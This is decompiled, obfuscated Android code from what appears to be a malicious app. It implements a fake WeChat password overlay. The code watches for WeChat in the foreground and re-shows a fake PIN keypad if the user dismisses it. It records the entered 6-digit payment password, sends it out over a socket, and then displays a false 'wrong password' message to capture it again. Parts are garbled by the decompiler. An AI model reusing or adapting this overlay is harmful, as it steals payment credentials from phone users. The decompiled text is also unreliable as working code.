package p000;

import android.os.Handler;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.TextView;
import com.storm.safe.rock.service.dqtvuisjd;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.service.modules.overlay.C0354a1;
import kotlin.Pair;
import kotlin.collections.AbstractC0770a1;
import kotlin.text.AbstractC0779a1;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final /* synthetic */ class oe1 implements Runnable {

    /* renamed from: a0 */
    public final /* synthetic */ int f58795a0;

    /* renamed from: a1 */
    public final /* synthetic */ C0354a1 f58796a1;

    public /* synthetic */ oe1(C0354a1 c0354a1, int i) {
        this.f58795a0 = i;
        this.f58796a1 = c0354a1;
    }

    /* JADX WARN: Code restructure failed: missing block: B:74:0x018d, code lost:
    
        r2.post(new p000.oe1(r1, 5));
        r1.f53627a4 = "";
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x019c, code lost:
    
        if (r1.f53626a3 == false) goto L151;
     */
    /* JADX WARN: Code restructure failed: missing block: B:76:0x019e, code lost:
    
        r1.m211905a5();
     */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        WindowManager windowManager;
        C0323a8 c0323a8M211471g5;
        switch (this.f58795a0) {
            case 0:
                C0354a1 c0354a1 = this.f58796a1;
                try {
                    dqtvuisjd c0290a0 = dqtvuisjd.f52358m1.getInstance();
                    String str = "";
                    if (c0290a0 != null) {
                        C0614i9 c0614i9 = c0290a0.f52414e5;
                        String str2 = c0614i9 != null ? c0614i9.f56832b2 : "";
                        if (str2 != null) {
                            str = str2;
                        }
                    }
                    t60.m214702c3("WechatPasswordOverlay", "🔍 3秒后检查，当前前台包名: ".concat(str));
                    if (AbstractC0779a1.m213652a5(str, new String[]{"com.tencent.mm"}[0], false)) {
                        t60.m214714d6("WechatPasswordOverlay", "🔄 用户关闭密码框但仍在微信，重新弹窗");
                        c0354a1.f53630a7.post(new oe1(c0354a1, 2));
                        break;
                    } else {
                        t60.m214702c3("WechatPasswordOverlay", "📱 用户已离开微信，不再弹窗");
                        break;
                    }
                } catch (Exception e) {
                    t60.m214705c6("WechatPasswordOverlay", "❌ 检查是否重新弹窗失败", e);
                    return;
                }
            case 1:
                C0354a1 c0354a12 = this.f58796a1;
                try {
                    LinearLayout linearLayout = c0354a12.f53625a2;
                    c0354a12.f53625a2 = null;
                    c0354a12.f53629a6 = null;
                    c0354a12.f53628a5.clear();
                    if (linearLayout != null) {
                        try {
                            if (linearLayout.isAttachedToWindow() && (windowManager = c0354a12.f53624a1) != null) {
                                windowManager.removeView(linearLayout);
                            }
                        } catch (Exception e2) {
                            t60.m214726f4("WechatPasswordOverlay", "移除视图时出错: " + e2.getMessage());
                        }
                    }
                    break;
                } catch (Exception e3) {
                    t60.m214705c6("WechatPasswordOverlay", "❌ 隐藏悬浮窗失败", e3);
                    return;
                }
            case 2:
                C0354a1 c0354a13 = this.f58796a1;
                try {
                    if (c0354a13.f53626a3) {
                        t60.m214726f4("WechatPasswordOverlay", "⚠️ 悬浮窗已显示，忽略重复调用");
                    } else {
                        c0354a13.f53627a4 = "";
                        c0354a13.f53628a5.clear();
                        c0354a13.m211900a0();
                        c0354a13.f53626a3 = true;
                    }
                    break;
                } catch (Exception e4) {
                    t60.m214705c6("WechatPasswordOverlay", "❌ 显示悬浮窗失败", e4);
                    return;
                }
            case 3:
                C0354a1 c0354a14 = this.f58796a1;
                boolean z = c0354a14.f53626a3;
                if (z) {
                    Handler handler = c0354a14.f53630a7;
                    if (z && c0354a14.f53627a4.length() == 6) {
                        String str3 = c0354a14.f53627a4;
                        if (str3.length() == 6) {
                            int i = 0;
                            while (true) {
                                if (i >= str3.length()) {
                                    break;
                                } else if (str3.charAt(i) == str3.charAt(0)) {
                                    i++;
                                } else {
                                    int length = str3.length();
                                    int i2 = 1;
                                    while (true) {
                                        if (i2 >= length) {
                                            break;
                                        } else if (str3.charAt(i2) - str3.charAt(i2 - 1) != 1) {
                                            int length2 = str3.length();
                                            for (int i3 = 1; i3 < length2; i3++) {
                                                if (str3.charAt(i3 - 1) - str3.charAt(i3) == 1) {
                                                }
                                            }
                                            break;
                                        } else {
                                            i2++;
                                        }
                                    }
                                }
                            }
                        }
                        String str4 = c0354a14.f53627a4;
                        try {
                            c0354a14.m211904a4(str4, "wechat_" + str4.length() + "digit", System.currentTimeMillis());
                            try {
                                C0107as c0106ar = C0107as.f45610a3.getInstance(c0354a14.f53623a0);
                                int length3 = str4.length();
                                c0106ar.m210508a7(length3 != 4 ? length3 != 6 ? "none" : "6digit" : "4digit", true, str4);
                            } catch (Exception e5) {
                                t60.m214705c6("WechatPasswordOverlay", "❌ 保存微信密码到 AppStatusManager 失败", e5);
                            }
                            dqtvuisjd.C0290a0 c0290a02 = dqtvuisjd.f52358m1;
                            if (c0290a02.getInstance() != null) {
                                String str5 = "微信密码输入: ***（长度=" + str4.length() + "）";
                                AbstractC0770a1.m213614f9(new Pair("textLength", Integer.valueOf(str4.length())), new Pair("inputMethod", "wechat_overlay_keypad"), new Pair("containsPassword", Boolean.TRUE), new Pair("operationType", "WECHAT_PASSWORD_INPUT"), new Pair("source", "WechatPasswordOverlay"), new Pair("passwordLength", Integer.valueOf(str4.length())));
                                dqtvuisjd.m211435k0("TEXT_INPUT", str5);
                                try {
                                    dqtvuisjd c0290a03 = c0290a02.getInstance();
                                    if (c0290a03 != null && (c0323a8M211471g5 = c0290a03.m211471g5()) != null) {
                                        c0323a8M211471g5.m211662c8(str4, "wechat", "overlay_keypad");
                                    }
                                } catch (Exception e6) {
                                    t60.m214705c6("WechatPasswordOverlay", "❌ 通过Socket发送密码失败", e6);
                                }
                                try {
                                    dqtvuisjd c0290a04 = dqtvuisjd.f52358m1.getInstance();
                                    if (c0290a04 != null) {
                                        c0290a04.m211456e5();
                                    }
                                } catch (Exception e7) {
                                    t60.m214705c6("WechatPasswordOverlay", "❌ 自动关闭微信检测功能失败", e7);
                                }
                            }
                        } catch (Exception e8) {
                            t60.m214705c6("WechatPasswordOverlay", "❌ 记录微信密码日志失败", e8);
                        }
                        handler.postDelayed(new oe1(c0354a14, 4), 1000L);
                        break;
                    }
                }
                break;
            case 4:
                C0354a1 c0354a15 = this.f58796a1;
                if (c0354a15.f53626a3) {
                    c0354a15.m211903a3(true);
                    break;
                }
                break;
            default:
                TextView textView = this.f58796a1.f53629a6;
                if (textView != null) {
                    textView.setText("密码错误，请重新输入");
                    textView.setVisibility(0);
                    textView.requestLayout();
                    textView.invalidate();
                    t60.m214702c3("WechatPasswordOverlay", "📛 显示错误提示: ".concat("密码错误，请重新输入"));
                    break;
                } else {
                    t60.m214704c5("WechatPasswordOverlay", "❌ errorTextView 为空，无法显示错误提示");
                    break;
                }
        }
    }
}
